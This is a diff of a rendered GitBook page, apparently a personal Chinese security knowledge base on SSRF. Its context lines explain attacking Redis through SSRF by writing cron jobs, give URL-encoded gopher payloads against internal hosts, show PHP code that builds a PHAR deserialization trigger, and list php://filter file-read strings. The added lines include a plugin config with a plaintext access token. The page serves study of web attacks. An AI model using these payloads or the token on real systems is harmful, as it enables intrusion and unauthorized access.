 &#x4E0B;&#x9762;&#x662F;&#x5177;&#x4F53;&#x653B;&#x51FB;redis&#x670D;&#x52A1;&#xFF0C;&#x7531;&#x4E8E;Redis&#x5728;Ubuntu&#x4E0A;&#xFF0C;&#x5199;&#x5165;&#x5B9A;&#x65F6;&#x4EFB;&#x52A1;&#x4F1A;&#x9884;&#x68C0;&#xFF0C;&#x5BFC;&#x81F4;&#x65E0;&#x6CD5;&#x6267;&#x884C;&#xFF0C;&#x4F46;&#x662F;&#x5728;centos&#x4E0A;&#x662F;&#x6CA1;&#x6709;&#x95EE;&#x9898;&#x7684;
-<a href="SSRF.assets/2023_05_19_10_39_37_JEUmtA7p.png" data-lightbox="4b7e09e9-ce6e-49aa-8e68-b35706d4bcff" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_37_JEUmtA7p.png" alt="image.png"></a>
-<a href="SSRF.assets/2023_05_19_10_39_37_rqBCT6LK.png" data-lightbox="30b450a5-3b01-4922-b83d-b35e8e81d01d" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_37_rqBCT6LK.png" alt="image.png"></a>
-<a href="SSRF.assets/2023_05_19_10_39_38_2ZEXoIYz.png" data-lightbox="74df2108-a6a2-4c85-a577-9d80aec00afb" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_38_2ZEXoIYz.png" alt="image.png"></a>
-<a href="SSRF.assets/2023_05_19_10_39_38_guGS63m0.png" data-lightbox="ff87985d-a4cb-449e-9a92-d7c2cf183a1b" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_38_guGS63m0.png" alt="image.png"></a>
-<a href="SSRF.assets/2023_05_19_10_39_38_45eTw7y2.png" data-lightbox="3f004b4a-c61a-42dd-a8ee-ba2f52e18dcd" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_38_45eTw7y2.png" alt="image.png"></a>
-<a href="SSRF.assets/2023_05_19_10_39_39_VZKPAhtM.png" data-lightbox="9af4ea93-423a-49ee-877c-3c81667506a0" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_39_VZKPAhtM.png" alt="image.png"></a>
-<a href="SSRF.assets/2023_05_19_10_39_39_qc40tQuW.png" data-lightbox="4470c306-e3fc-41ee-a3c4-ecb6ce4b15d4" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_39_qc40tQuW.png" alt="image.png"></a>
+<a href="SSRF.assets/2023_05_19_10_39_37_JEUmtA7p.png" data-lightbox="5a2f4b68-ac16-4241-99b4-67f7e4424588" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_37_JEUmtA7p.png" alt="image.png"></a>
+<a href="SSRF.assets/2023_05_19_10_39_37_rqBCT6LK.png" data-lightbox="63278571-7a80-409d-a0a5-80d392106e6e" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_37_rqBCT6LK.png" alt="image.png"></a>
+<a href="SSRF.assets/2023_05_19_10_39_38_2ZEXoIYz.png" data-lightbox="93220898-77df-44a7-b80a-daa34e63c4ce" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_38_2ZEXoIYz.png" alt="image.png"></a>
+<a href="SSRF.assets/2023_05_19_10_39_38_guGS63m0.png" data-lightbox="297c540a-2448-47fc-be6c-acd30b3ae8b9" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_38_guGS63m0.png" alt="image.png"></a>
+<a href="SSRF.assets/2023_05_19_10_39_38_45eTw7y2.png" data-lightbox="576611ed-d99e-4e71-a79f-855a77459f51" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_38_45eTw7y2.png" alt="image.png"></a>
+<a href="SSRF.assets/2023_05_19_10_39_39_VZKPAhtM.png" data-lightbox="c7175960-049a-4f66-bf2e-f1cddde8774c" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_39_VZKPAhtM.png" alt="image.png"></a>
+<a href="SSRF.assets/2023_05_19_10_39_39_qc40tQuW.png" data-lightbox="8a0f3fe3-a9b7-4681-bf69-4fed9c307b66" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_39_qc40tQuW.png" alt="image.png"></a>
 &#x5BF9;&#x4E8E;&lt;&#x3001;?&#x3001;: &#x7B49;&#x7279;&#x6B8A;&#x7B26;&#x53F7;&#x9700;&#x8981;&#x8F6C;&#x4E3A;&#x5BF9;&#x5E94;&#x7684;16&#x8FDB;&#x5236;&#xFF1A;</p>
 <pre class="language-"><code class="lang-http">&lt; =&gt; \x3c 
 ? =&gt; \x3f 
@@ -3565,19 +3582,19 @@ cmd=system(&apos;whoami&apos;);
 <h4 id="gopher-&#x534F;&#x8BAE;">Gopher &#x534F;&#x8BAE;</h4>
 <p>&#x8BE5;&#x534F;&#x8BAE;&#x5728;PHP&#x4E2D;&#x9700;&#x8981;cURL&#x6269;&#x5C55;&#x652F;&#x6301;&#xFF0C;&#x4F7F;&#x7528;curl<em>exec(),curl_multi_exec()&#x51FD;&#x6570;&#x53D1;&#x8D77;&#x8BF7;&#x6C42;&#x3002;gopher&#x534F;&#x8BAE;&#x683C;&#x5F0F;&#x4E3A;gopher://IP:port/</em>{TCP/IP&#x6570;&#x636E;&#x6D41;}&#xFF0C;&#x5F00;&#x59CB;&#x7684;&#x5B57;&#x7B26;&#x53EF;&#x4EE5;&#x968F;&#x610F;&#xFF0C;&#x6570;&#x636E;&#x6D41;&#x4F7F;&#x7528;URL&#x7F16;&#x7801;&#xFF0C;&#x6211;&#x4EEC;&#x53D1;&#x9001;&#x5230;&#x7684;payload&#x9700;&#x8981;&#x53CC;&#x7F16;&#x7801;&#xFF0C;&#x56E0;&#x4E3A;gopher&#x534F;&#x8BAE;&#x4F1A;&#x5C06;url&#x89E3;&#x7801;&#x4E00;&#x6B21;&#xFF0C;&#x518D;&#x8FDB;&#x884C;&#x4F20;&#x8F93;&#x4E0D;&#x8BA4;&#x8BC6;\r\n&#x6216;&#x8005;?&#x5C31;&#x4E0D;&#x80FD;&#x6210;&#x529F;
 &#x6CE8;&#x610F;&#xFF0C;GET &#x8BF7;&#x6C42;&#x4E0D;&#x5E26;HTTP&#x534F;&#x8BAE;&#x7248;&#x672C;&#xFF0C;POST&#x8BF7;&#x6C42;&#x4E00;&#x5B9A;&#x8981;&#x5E26;HTTP&#x534F;&#x8BAE;&#x7248;&#x672C;
-<a href="SSRF.assets/2023_05_19_10_39_40_pkfH0UPn.png" data-lightbox="cf55f9ab-f8f9-48d6-a712-7ebc2399b1ca" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_40_pkfH0UPn.png" alt="image.png"></a>
-<a href="SSRF.assets/2023_05_19_10_39_40_ovTkS6fF.png" data-lightbox="5d447271-57ed-4973-90e0-92733bba9c43" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_40_ovTkS6fF.png" alt="image.png"></a>
+<a href="SSRF.assets/2023_05_19_10_39_40_pkfH0UPn.png" data-lightbox="d59b2cf8-e5c5-420e-bcfe-658542990049" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_40_pkfH0UPn.png" alt="image.png"></a>
+<a href="SSRF.assets/2023_05_19_10_39_40_ovTkS6fF.png" data-lightbox="63ccbbbd-f5b9-4a62-a831-f5299d8e0e5b" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_40_ovTkS6fF.png" alt="image.png"></a>
 &#x5C06;?(%3f)&#x7F16;&#x7801;&#x6210;(%25%3f)</p>
 <pre class="language-"><code class="lang-http"><span class="token header"><span class="token header-name keyword">gopher</span><span class="token punctuation">:</span><span class="token header-value">//192.168.200.38:8888/_%47%45%54%20%2f%74%65%73%74%2e%70%68%70%253f%66%69%6c%65%31%3d%73%68%65%6c%6c%2e%70%68%70%250d%250a%48%6f%73%74%3a%20%31%32%37%2e%30%2e%30%2e%31</span></span>
 </code></pre>
-<p><a href="SSRF.assets/2023_05_19_10_39_41_cGnkaMb9.png" data-lightbox="37bd7c1e-b01a-465a-b4f2-1dde5bdce900" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_41_cGnkaMb9.png" alt="image.png"></a>
-<a href="SSRF.assets/2023_05_19_10_39_41_oiWXhqEr.png" data-lightbox="6d731a03-1f4a-49de-98c8-5d1a8fe15a16" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_41_oiWXhqEr.png" alt="image.png"></a>
+<p><a href="SSRF.assets/2023_05_19_10_39_41_cGnkaMb9.png" data-lightbox="5d86334b-2942-45ff-8db8-8869a343109d" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_41_cGnkaMb9.png" alt="image.png"></a>
+<a href="SSRF.assets/2023_05_19_10_39_41_oiWXhqEr.png" data-lightbox="b1d7cb5c-4750-4a2c-bc52-733e2f699b7b" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_41_oiWXhqEr.png" alt="image.png"></a>
 POST&#x9700;&#x8981;Content-Type,Content-Length,HOST,POST_DATA&#xFF0C;&#x8BF7;&#x6C42;&#x4F53;&#x6574;&#x4F53;URL&#x7F16;&#x7801;
-<a href="SSRF.assets/2023_05_19_10_39_42_VKu049DH.png" data-lightbox="7cd9fdcc-d053-4066-9470-c27320942a64" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_42_VKu049DH.png" alt="image.png"></a>
-<a href="SSRF.assets/2023_05_19_10_39_42_iKgVOqFn.png" data-lightbox="f85388e3-77e4-4b67-af86-0b52403cac01" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_42_iKgVOqFn.png" alt="image.png"></a></p>
+<a href="SSRF.assets/2023_05_19_10_39_42_VKu049DH.png" data-lightbox="d871e858-bf41-4cac-a163-0ac7ed8866fb" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_42_VKu049DH.png" alt="image.png"></a>
+<a href="SSRF.assets/2023_05_19_10_39_42_iKgVOqFn.png" data-lightbox="ed572f57-e401-4723-b783-7816161470fd" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_42_iKgVOqFn.png" alt="image.png"></a></p>
 <pre class="language-"><code class="lang-http"><span class="token header"><span class="token header-name keyword">gopher</span><span class="token punctuation">:</span><span class="token header-value">//192.168.200.76:80/_%50%4f%53%54%20%2f%74%65%73%74%31%2e%70%68%70%20%48%54%54%50%20%2f%31%2e%31%250d%250a%48%6f%73%74%3a%20%31%32%37%2e%30%2e%30%2e%31%250d%250a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%2d%77%77%77%2d%66%6f%72%6d%2d%75%72%6c%65%6e%63%6f%64%65%64%250d%250a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%38%250d%250a%250d%250a%64%61%74%61%3d%31%32%33</span></span>
 </code></pre>
-<p><a href="SSRF.assets/2023_05_19_10_39_43_1E72cCIK.png" data-lightbox="6f0c4374-28a9-40a6-95c4-71d252a79655" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_43_1E72cCIK.png" alt="image.png"></a></p>
+<p><a href="SSRF.assets/2023_05_19_10_39_43_1E72cCIK.png" data-lightbox="70417388-f6cb-4ae0-ad2e-f8892bc89073" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_43_1E72cCIK.png" alt="image.png"></a></p>
 <h4 id="phar-&#x534F;&#x8BAE;">PHAR &#x534F;&#x8BAE;</h4>
 <p>PHAR&#x534F;&#x8BAE;&#x7528;&#x4E8E;&#x5728;PHP&#x4E2D;&#x89E3;&#x6790;phar&#x6587;&#x4EF6;&#xFF0C;phar&#x6587;&#x4EF6;&#x7684;meta-data&#x5B57;&#x6BB5;&#x5B58;&#x5728;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x534F;&#x8BAE;&#x8BFB;&#x53D6;&#x6587;&#x4EF6;&#x89E6;&#x53D1;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#xFF0C;&#x6F0F;&#x6D1E;&#x4EE3;&#x7801;&#xFF1A;</p>
 <pre class="language-"><code class="lang-php"><span class="token delimiter important">&lt;?php</span> 
@@ -3607,16 +3624,16 @@ POST&#x9700;&#x8981;Content-Type,Content-Length,HOST,POST_DATA&#xFF0C;&#x8BF7;&#
 <span class="token variable">$phar</span> <span class="token operator">-&gt;</span> <span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$object</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token variable">$phar</span> <span class="token operator">-&gt;</span> <span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 </code></pre>
-<p><a href="SSRF.assets/2023_05_19_10_39_43_TQNc2EyJ.png" data-lightbox="e5ec0302-4577-4c4c-874b-526cdad41945" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_43_TQNc2EyJ.png" alt="image.png"></a>
-<a href="SSRF.assets/2023_05_19_10_39_43_nUxeYPyj.png" data-lightbox="5a222a66-e103-44e8-87e8-d35829e0a406" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_43_nUxeYPyj.png" alt="image.png"></a></p>
+<p><a href="SSRF.assets/2023_05_19_10_39_43_TQNc2EyJ.png" data-lightbox="2cf8e369-061a-49bb-8295-da349564a1b6" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_43_TQNc2EyJ.png" alt="image.png"></a>
+<a href="SSRF.assets/2023_05_19_10_39_43_nUxeYPyj.png" data-lightbox="b740352e-b932-4fdc-8c47-2574f40033c1" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_43_nUxeYPyj.png" alt="image.png"></a></p>
 <h4 id="phpfilter">php://filter</h4>
 <p>&#x8BFB;&#x53D6;&#x672C;&#x5730;&#x6587;&#x4EF6;&#x5E76;&#x8FDB;&#x884C;base64&#x7F16;&#x7801;</p>
 <pre class="language-"><code>php://filter/convert.base64-encode/resource=xx.xx
 php://filter/read=convert.base64-encode/resource=xx.xx
-</code></pre><p><a href="SSRF.assets/2023_05_19_10_39_43_QkzA62v4.png" data-lightbox="74084fb2-3782-453b-b31c-49a7f7b04db7" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_43_QkzA62v4.png" alt="image.png"></a></p>
+</code></pre><p><a href="SSRF.assets/2023_05_19_10_39_43_QkzA62v4.png" data-lightbox="4ba3832c-243a-423d-a520-a1542c9cc2d4" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_43_QkzA62v4.png" alt="image.png"></a></p>
 <h4 id="phpinput">php://input</h4>
 <p>&#x53EF;&#x4EE5;&#x83B7;&#x53D6;&#x8BF7;&#x6C42;&#x4E2D;&#x7684;&#x539F;&#x59CB;&#x6D41;&#xFF0C;&#x5982;&#x8BFB;&#x53D6;POST&#x8F93;&#x5165;&#x6D41;
-<a href="SSRF.assets/2023_05_19_10_39_44_IHTvPbEj.png" data-lightbox="1c84c258-dd01-47fb-9845-f87b20fb18ac" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_44_IHTvPbEj.png" alt="image.png"></a></p>
+<a href="SSRF.assets/2023_05_19_10_39_44_IHTvPbEj.png" data-lightbox="51a526ff-c6f6-47b2-b4b9-cbc2277049ec" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_44_IHTvPbEj.png" alt="image.png"></a></p>
 <h2 id="&#x53C2;&#x8003;&#x94FE;&#x63A5;">&#x53C2;&#x8003;&#x94FE;&#x63A5;</h2>
 <p><a href="https://cheatsheetseries.owasp.org/assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_SSRF_Bible.pdf" target="_blank">https://cheatsheetseries.owasp.org/assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_SSRF_Bible.pdf</a></p>
 <footer class="page-footer"><span class="copyright">Copyright &#xA9; aaron 2023 all right reserved&#xFF0C;powered by Gitbook</span><span class="footer-modification">&#x8BE5;&#x6587;&#x7AE0;&#x4FEE;&#x8BA2;&#x65F6;&#x95F4;&#xFF1A;
@@ -3663,7 +3680,7 @@ php://filter/read=convert.base64-encode/resource=xx.xx
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"06.SSRF","level":"1.2.7","depth":2,"next":{"title":"SSRF示例（weblogic_SSRF）","level":"1.2.7.1","depth":3,"path":"知识库/01.WEB安全/06.SSRF/SSRF示例（weblogic_SSRF）.md","ref":"知识库/01.WEB安全/06.SSRF/SSRF示例（weblogic_SSRF）.md","articles":[]},"previous":{"title":"03.文件读取","level":"1.2.6.3","depth":3,"path":"知识库/01.WEB安全/05.文件操作/03.文件读取.md","ref":"知识库/01.WEB安全/05.文件操作/03.文件读取.md","articles":[]},"dir":"ltr"},"config":{"plugins":["splitter","hide-element","code","theme-d4t","-lunr","-search","-sharing","search-pro-fixed","-highlight","chapter-fold","expandable-chapters","lightbox","tbfed-pagefooter","github","flexible-alerts","prism","back-to-top-button","auto-scroll-table","expandable-chapters","livereload"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"theme-d4t":{},"tbfed-pagefooter":{"copyright":"Copyright &copy aaron 2023","modify_label":"该文章修订时间：","modify_format":"YYYY-MM-DD HH:mm:ss"},"chapter-fold":{},"prism":{"css":["prismjs/themes/prism-tomorrow.css"],"lang":{"flow":"typescript","shell":"bash","xml-dtd":"xml"},"ignore":["mermaid","eval-js","ascii","result","manifest","payload","google","tree","java_out","log4j2","jsp","class","Exception","stack","c#","xml-dtd","C++","twig","jinja2","exception","tpl"]},"github":{"url":"https://github.com/byAaronLuo"},"d4t":{"search-placeholder":"请输入关键字搜索","logo":"/README.assets/logo.svg","favicon":"/README.assets/favicon.ico"},"livereload":{},"splitter":{},"auto-scroll-table":{},"code":{"copyButtons":true},"search-pro-fixed":{},"hide-element":{"elements":[".gitbook-link",".title",".treeview__copyright",".treeview__main-title"]},"fontsettings":{"theme":"white","family":"sans","size":2},"lightbox":{"jquery":true,"sameUuid":false},"back-to-top-button":{},"flexible-alerts":{"danger":{"className":"danger","icon":"fa fa-ban","label":"Attention"},"note":{"className":"info","icon":"fa fa-info-circle","label":"Note"},"style":"callout","tip":{"className":"tip","icon":"fa fa-lightbulb-o","label":"Tip"},"warning":{"className":"warning","icon":"fa fa-exclamation-triangle","label":"Warning"},"comment":{"label":"Comment","icon":"fa fa-comments","className":"info"}},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"expandable-chapters":{"collapsible":true,"level":2,"prepend":true,"scrollToTitle":true}},"theme":"default","author":"aaron","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"Aaron 知识库","gitbook":"*","description":"个人的部分知识技能，倾向于使用知识库的方式进行总结回顾自己","theme-default":{"showLevel":true}},"file":{"path":"知识库/01.WEB安全/06.SSRF/README.md","mtime":"2023-06-06T05:59:24.111Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2023-06-19T10:00:09.589Z"},"basePath":"../../..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"06.SSRF","level":"1.2.7","depth":2,"next":{"title":"SSRF示例（weblogic_SSRF）","level":"1.2.7.1","depth":3,"path":"知识库/01.WEB安全/06.SSRF/SSRF示例（weblogic_SSRF）.md","ref":"知识库/01.WEB安全/06.SSRF/SSRF示例（weblogic_SSRF）.md","articles":[]},"previous":{"title":"03.文件读取","level":"1.2.6.3","depth":3,"path":"知识库/01.WEB安全/05.文件操作/03.文件读取.md","ref":"知识库/01.WEB安全/05.文件操作/03.文件读取.md","articles":[]},"dir":"ltr"},"config":{"plugins":["splitter","hide-element","code","theme-d4t","-lunr","-search","-sharing","search-pro-fixed","-highlight","chapter-fold","expandable-chapters","lightbox","tbfed-pagefooter","github","flexible-alerts","prism","back-to-top-button","auto-scroll-table","expandable-chapters","lock","livereload"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"theme-d4t":{},"tbfed-pagefooter":{"copyright":"Copyright &copy aaron 2023","modify_label":"该文章修订时间：","modify_format":"YYYY-MM-DD HH:mm:ss"},"chapter-fold":{},"prism":{"css":["prismjs/themes/prism-tomorrow.css"],"lang":{"flow":"typescript","shell":"bash","xml-dtd":"xml"},"ignore":["mermaid","eval-js","ascii","result","manifest","payload","google","tree","java_out","log4j2","jsp","class","Exception","stack","c#","xml-dtd","C++","twig","jinja2","exception","tpl"]},"github":{"url":"https://github.com/byAaronLuo"},"d4t":{"search-placeholder":"请输入关键字搜索","logo":"/README.assets/logo.svg","favicon":"/README.assets/favicon.ico"},"livereload":{},"splitter":{},"lock":{"verificationCode":{"key":"Token","value":"!&pF@RFL8Vs$nhM6"},"lockTokenKey":"Token","email":"aaronluo54@gmail.com","allPage":false,"articleHeightPercent":0},"auto-scroll-table":{},"code":{"copyButtons":true},"search-pro-fixed":{},"hide-element":{"elements":[".gitbook-link",".title",".treeview__copyright",".treeview__main-title"]},"fontsettings":{"theme":"white","family":"sans","size":2},"lightbox":{"jquery":true,"sameUuid":false},"back-to-top-button":{},"flexible-alerts":{"danger":{"className":"danger","icon":"fa fa-ban","label":"Attention"},"note":{"className":"info","icon":"fa fa-info-circle","label":"Note"},"style":"callout","tip":{"className":"tip","icon":"fa fa-lightbulb-o","label":"Tip"},"warning":{"className":"warning","icon":"fa fa-exclamation-triangle","label":"Warning"},"comment":{"label":"Comment","icon":"fa fa-comments","className":"info"}},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"expandable-chapters":{"collapsible":true,"level":2,"prepend":true,"scrollToTitle":true}},"theme":"default","author":"aaron","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"Aaron 知识库","gitbook":"*","description":"个人的部分知识技能，倾向于使用知识库的方式进行总结回顾自己","theme-default":{"showLevel":true}},"file":{"path":"知识库/01.WEB安全/06.SSRF/README.md","mtime":"2023-06-06T05:59:24.111Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2023-06-22T15:20:17.199Z"},"basePath":"../../..","book":{"language":""}});
         });
     </script>
 </div>
@@ -3718,6 +3735,10 @@ php://filter/read=convert.base64-encode/resource=xx.xx
     
         
         <script src="../../../gitbook/gitbook-plugin-auto-scroll-table/plugin.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-lock/lock.js"></script>
         
     
         
